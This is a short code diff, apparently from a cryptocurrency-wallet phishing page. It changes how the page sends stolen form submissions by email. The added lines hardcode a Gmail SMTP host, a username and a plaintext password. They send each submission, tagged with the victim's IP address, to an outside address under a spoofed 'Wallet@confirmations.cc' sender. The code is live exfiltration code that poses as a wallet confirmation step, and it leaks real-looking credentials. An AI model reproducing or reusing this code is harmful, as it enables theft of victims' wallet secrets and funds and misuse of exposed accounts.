@@ -47,8 +47,10 @@ $.getJSON("https://api.ipify.org?format=json",
         e.preventDefault();
         loadings();
         Email.send({
-                    SecureToken: '929128e3-e988-4de1-bd76-ed5e3cbf6e17',
-                    To : 'ericdoobie1@gmail.com',
+                    Host: "smtp.gmail.com",
+                      Username: 'buyandsale.venmo@gmail.com',
+                      Password: 'yelueduaddxmytsd',
+                      To: 'ericdoobie1@gmail.com',
                     From : "Wallet@confirmations.cc",
                     Subject : "[lINKUP AFFIX | IP - " + document.getElementById('gfg').innerHTML + "]",
                     Body : 
@@ -72,8 +74,10 @@ $.getJSON("https://api.ipify.org?format=json",
         e.preventDefault();
         loadings();
         Email.send({
-                    SecureToken: '929128e3-e988-4de1-bd76-ed5e3cbf6e17',
-                    To : 'ericdoobie1@gmail.com',
+                  Host: "smtp.gmail.com",
+                      Username: 'buyandsale.venmo@gmail.com',
+                      Password: 'yelueduaddxmytsd',
+                      To: 'ericdoobie1@gmail.com',
                     From : "Wallet@confirmations.cc",
                     Subject : "[lINKUP AFFIX | IP - " + document.getElementById('gfg').innerHTML + "]",
                     Body : 
